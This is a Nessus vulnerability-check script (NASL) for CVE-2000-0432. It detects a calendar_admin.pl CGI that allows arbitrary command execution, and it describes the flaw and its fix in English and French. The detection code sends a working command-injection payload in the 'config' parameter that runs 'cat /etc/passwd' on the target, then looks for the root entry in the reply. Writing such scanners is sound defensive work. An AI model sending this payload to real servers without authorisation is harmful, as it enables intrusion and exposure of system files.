#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10506);
 script_bugtraq_id(1215);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0432");
 name["english"] = "calendar_admin.pl";
 name["francais"] = "calendar_admin.pl";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'calendar_admin.pl' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'calendar_admin.pl' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/calendar_admin.pl";
 summary["francais"] = "Vérifie la présence de /cgi-bin/calendar_admin.pl";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);

function go(dir, cgi, port)
{
 item = string(dir, "/", cgi, "?config=|cat%20/etc/passwd|");
 req = http_get(item:item, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL)exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:r))
  {
   security_hole(port);
   exit(0);
  }
}

foreach dir (cgi_dirs())
{
 go(dir:dir, cgi:"calendar_admin.pl", port:port);
# go(dir:dir, cgi:"calendar/calendar_admin.pl", port:port);
# go(dir:dir, cgi:"calendar/calender.pl", port:port);
}
